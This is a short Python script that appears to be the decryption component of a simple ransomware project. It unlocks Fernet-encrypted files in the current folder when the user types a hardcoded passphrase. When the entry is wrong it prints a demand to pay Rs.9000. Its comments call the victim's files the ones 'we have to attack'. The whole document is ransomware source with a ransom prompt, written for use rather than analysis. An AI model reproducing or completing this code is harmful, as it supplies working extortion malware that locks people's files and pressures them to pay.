import os
from cryptography.fernet import Fernet

Files = []

for file in os.listdir():

    # It show all file which we have to attack except Virus.py
    if file == "Virus.py" or file == "Security Key.key" or file == "Virus Decrypt.py":
        continue

    # For Removing Directory
    if os.path.isfile(file): 
        Files.append(file)

with open("Security Key.key", "rb") as k:
    secret_key = k.read()

secret_phrase = "Ayush"

user_entry = input("Enter the secret code to decrypt your files:  ")

if user_entry == secret_phrase:

    # Logic to decrypt files
    for file in Files:
        with open(file, "rb") as theFile:
            content = theFile.read()
        decrypted_content = Fernet(secret_key).decrypt(content)

        with open(file, "wb") as theFile:
            theFile.write(decrypted_content)

    print("Your all file was DECRYPTED")
else:
    print("WRONG passkey you have to pay Rs.9000 to unlock all files")